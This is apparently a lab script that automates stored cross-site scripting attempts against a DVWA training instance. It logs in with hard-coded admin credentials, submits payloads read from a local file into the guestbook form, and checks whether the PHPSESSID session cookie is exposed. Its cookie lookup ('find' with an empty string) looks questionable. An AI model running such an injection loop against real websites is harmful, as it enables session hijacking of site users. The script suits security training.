from seleniumwire import webdriver
from bs4 import BeautifulSoup as bs

driver = webdriver.Firefox()

file = open("/root/dvwa_py/xss","r")
inject = file.readlines()

driver.get("http://10.0.2.15:8080/login.php")

URL = 'http://10.0.2.15:8080/vulnerabilities/xss_s/'

delay = 3

driver.implicitly_wait(delay)

driver.find_element_by_name('username').send_keys('admin')
driver.find_element_by_name('password').send_keys('1234')
driver.find_element_by_xpath('/html/body/div/div[2]/form/fieldset/p/input').click()

for i in inject:
    driver.get(URL)
    driver.find_element_by_name('txtName').send_keys('test')
    driver.find_element_by_name('mtxMessage').send_keys(i)
    driver.find_element_by_xpath('/html/body/div/div[3]/div/div/form/table/tbody/tr[3]/td[2]/input[1]').click()
    res = driver.page_source
    
    soup=bs(res,"html.parser")
    cookie = soup.find('')
    if(cookie.text.find("PHPSESSID")!=-1):
        print("\n\n")
        print(cookie)
        print("\n\n")
        print("XSS_success!")
        print("\n\n")
    else:
        print("\n\n")
        print("Injection Attempt :" +i)
        print("Fail")
        print("\n\n------------------------")

driver.close()
'''
